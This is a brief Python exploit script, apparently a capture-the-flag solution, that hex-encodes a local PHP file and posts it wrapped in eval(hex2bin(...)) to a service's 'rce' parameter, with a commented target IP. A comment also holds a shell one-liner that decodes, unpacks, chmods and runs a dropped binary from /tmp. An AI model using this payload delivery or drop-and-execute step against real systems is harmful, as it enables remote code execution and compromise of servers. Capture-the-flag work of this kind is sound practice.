import requests

# payload = 'eval(hex2bin("%s"));' % open('x.php').read().replace('<?php\n', '').encode('hex')
payload = 'eval(hex2bin("%s"));' % (open('x.php', 'rb').read().replace(b'<?php\n', b'').hex())

print(requests.post('http://127.0.0.1:11514', data={'rce': payload}).content)
# print requests.post('http://52.53.55.151:11514', data={'rce': payload}).content

# base64 -d /tmp/cmb | gunzip -c > /tmp/xxx; chmod 777 /tmp/xxx; /tmp/xxx
# rwctf{+++just_a_check_in_flag_have_a_good_time+++:)}
